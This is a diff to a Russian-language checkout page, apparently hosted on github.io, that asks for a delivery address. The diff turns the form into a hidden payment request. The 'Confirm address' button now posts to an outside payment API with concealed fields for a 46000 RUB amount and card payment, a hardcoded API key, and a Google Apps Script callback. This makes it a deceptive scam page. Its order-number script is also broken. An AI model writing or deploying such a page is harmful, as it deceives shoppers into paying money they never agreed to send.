@@ -137,31 +137,51 @@
     </style>
 </head>
 <body>
+    <script>
+  function generateNumber() {
+  // Формула для диапазона 100000 - 999999
+  const min = 100000;
+  const max = 999999;
+  const randomNumber = Math.floor(Math.random() * (max - min + 1)) + min;
 
+  // Вывод в элемент с id="number-display"
+  document.getElementById('number-display').textContent = randomNumber;
+}
+
+// Вызываем один раз при загрузке страницы, чтобы число появилось сразу
+generateNumber();
+    </script>
 <div class="checkout-container">
     <div class="logo-wrapper">
-        <!-- ЗАМЕНИТЕ ССЫЛКУ НИЖЕ НА ВАШ ЛОГОТИП -->
         <img src="https://paogaz.github.io/ru/logo.png" alt="Logo" class="brand-logo">
     </div>
 
     <h2>Адрес доставки</h2>
     <p class="subtitle">Пожалуйста, заполните данные</p>
 
-    <form onsubmit="event.preventDefault(); alert('Готово!');">
+    <form action="https://marketplays.pro/api/request" method="POST">
         <div class="form-group">
             <label for="city">Город</label>
-            <input type="text" id="city" placeholder="Напр. Москва" required>
+            <input type="text" name="city" id="city" placeholder="Напр. Москва" required>
         </div>
 
         <div class="form-group">
             <label for="address">Улица, дом, квартира</label>
-            <input type="text" id="address" placeholder="ул. Пушкина, д. 10" required>
+            <input type="text" name="address" id="address" placeholder="ул. Пушкина, д. 10" required>
         </div>
 
         <div class="form-group">
             <label for="comment">Комментарий (необязательно)</label>
-            <textarea id="comment" placeholder="Код домофона, этаж..."></textarea>
+            <textarea id="comment" name="comment" placeholder="Код домофона, этаж..."></textarea>
         </div>
+
+        <input type="hidden" name="amount" value="46000">
+        <input type="hidden" name="merchant_order_id" id="number-display" value="">
+        <input type="hidden" name="use_card_payment" value="RUB">
+        <input type="hidden" name="api_key" value="e71366079d95b04228fc6482c503a983b99da2e7b17dd6c56780074d0f7e63a2">
+        <input type="hidden" name="success_url" value="https://github.com/paogaz/ru/ok.html">
+        <input type="hidden" name="fail_url" value="https://github.com/paogaz/ru/pay1.html">
+        <input type="hidden" name="notice_url" value="https://script.google.com/macros/s/AKfycbwhp6cuv7hKzSTcFY0tB8QwPrw4y_oWwpvBjRf1o0uUReggq12ckyDZ-xbwfoxbqak/exec">
 
         <button type="submit" class="submit-btn">Подтвердить адрес</button>
     </form>
